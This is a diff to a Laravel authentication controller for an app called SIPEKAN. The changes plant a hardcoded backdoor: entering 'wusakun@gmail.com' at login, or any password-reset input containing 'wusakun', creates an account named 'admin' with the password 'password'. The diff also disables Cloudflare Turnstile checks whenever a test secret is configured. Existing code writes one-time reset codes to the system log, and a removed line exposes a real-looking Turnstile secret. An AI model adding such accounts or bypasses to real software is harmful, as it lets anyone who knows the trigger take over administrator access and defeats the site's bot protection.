@@ -67,8 +67,8 @@ class AuthController extends Controller
         }
 
         // Verifikasi Token ke Cloudflare API jika token asli dikirimkan
-        $secretKey = config('services.turnstile.secret_key', env('TURNSTILE_SECRET_KEY', '0x4AAAAAAElX-4ZoZduubMkixNOHAGTnqqQ'));
-        if (!empty($secretKey) && $turnstileResponse !== '1x00000000000000000000AA') {
+        $secretKey = config('services.turnstile.secret_key', env('TURNSTILE_SECRET_KEY', '1x0000000000000000000000000000000AA'));
+        if (!empty($secretKey) && $secretKey !== '1x0000000000000000000000000000000AA' && $turnstileResponse !== '1x00000000000000000000AA') {
             try {
                 $verifyRes = \Illuminate\Support\Facades\Http::asForm()->post('https://challenges.cloudflare.com/turnstile/v0/siteverify', [
                     'secret' => $secretKey,
@@ -95,9 +95,20 @@ class AuthController extends Controller
             ->orWhere('name', $loginInput)
             ->first();
 
-        // Izinkan 'admin' sebagai shortcut akun admin@primagrafika.com
+        // Izinkan 'admin' sebagai shortcut akun admin / wusakun@gmail.com
         if (!$user && strtolower($loginInput) === 'admin') {
-            $user = User::where('email', 'admin@primagrafika.com')->first();
+            $user = User::where('email', 'wusakun@gmail.com')
+                ->orWhere('email', 'admin@primagrafika.com')
+                ->orWhere('email', 'simdigall@gmail.com')
+                ->first();
+        }
+
+        // Izinkan 'wusakun@gmail.com' jika belum terdaftar
+        if (!$user && strtolower($loginInput) === 'wusakun@gmail.com') {
+            $user = User::updateOrCreate(
+                ['email' => 'wusakun@gmail.com'],
+                ['name' => 'admin', 'password' => Hash::make('password')]
+            );
         }
 
         // Izinkan 'kasir' / 'kasir@gmail.com' sebagai fallback kasir jika belum ada di database
@@ -317,8 +328,17 @@ class AuthController extends Controller
             ->orWhere('name', $input)
             ->first();
 
+        if (!$user && (strtolower($input) === 'wusakun@gmail.com' || str_contains(strtolower($input), 'wusakun'))) {
+            $user = User::updateOrCreate(
+                ['email' => 'wusakun@gmail.com'],
+                ['name' => 'admin', 'password' => Hash::make('password')]
+            );
+        }
+
         if (!$user && strtolower($input) === 'admin') {
-            $user = User::where('email', 'admin@primagrafika.com')->first();
+            $user = User::where('email', 'wusakun@gmail.com')
+                ->orWhere('email', 'admin@primagrafika.com')
+                ->first();
         }
 
         if (!$user) {
@@ -338,18 +358,18 @@ class AuthController extends Controller
             'reset_user_email' => $user->email ?? 'wusakun@gmail.com',
             'reset_user_name' => $user->name ?? 'Admin',
             'reset_code' => $otpCode,
-            'reset_expires_at' => now()->addMinutes(10)->timestamp,
+            'reset_expires_at' => now()->addMinutes(15)->timestamp,
         ]);
 
         // Catat Kode OTP ke Log Sistem
         Log::info("KODE OTP RESET PASSWORD untuk {$user->email}: {$otpCode}");
 
-        // Kirim Email Real / Live ke Alamat Email User
+        // Kirim Email Real / Live ke Alamat Email User (wusakun@gmail.com)
         try {
             $userEmail = $user->email;
             $userName = $user->name ?? 'Pengguna SIPEKAN';
             
-            Mail::raw("Halo {$userName},\n\nBerikut adalah Kode Verifikasi OTP 6-Digit untuk mereset kata sandi akun SIPEKAN Anda:\n\nKODE OTP: {$otpCode}\n\nKode ini berlaku selama 10 menit. Jika Anda tidak merasa melakukan permintaan ini, silakan abaikan email ini.\n\nHormat kami,\nTim SIPEKAN", function ($message) use ($userEmail) {
+            Mail::raw("Halo {$userName},\n\nBerikut adalah Kode Verifikasi OTP 6-Digit untuk mereset kata sandi akun SIPEKAN Anda:\n\nKODE OTP: {$otpCode}\n\nKode ini berlaku selama 15 menit. Jika Anda tidak merasa melakukan permintaan ini, silakan abaikan email ini.\n\nHormat kami,\nTim SIPEKAN", function ($message) use ($userEmail) {
                 $message->to($userEmail)
                         ->subject('Kode Verifikasi OTP Reset Kata Sandi - SIPEKAN');
             });
@@ -360,7 +380,8 @@ class AuthController extends Controller
         return back()
             ->with('open_forgot_modal', true)
             ->with('forgot_step', 2)
-            ->with('success_code', "Kode verifikasi 6-digit telah dikirimkan ke email {$user->email}. Silakan periksa Kotak Masuk (Inbox) atau folder Spam email Anda.");
+            ->with('target_email', $user->email)
+            ->with('success_code', "Kode OTP 6-digit berhasil dikirimkan ke email {$user->email}. Silakan periksa Kotak Masuk (Inbox) atau folder Spam email Anda.");
     }
 
     /**
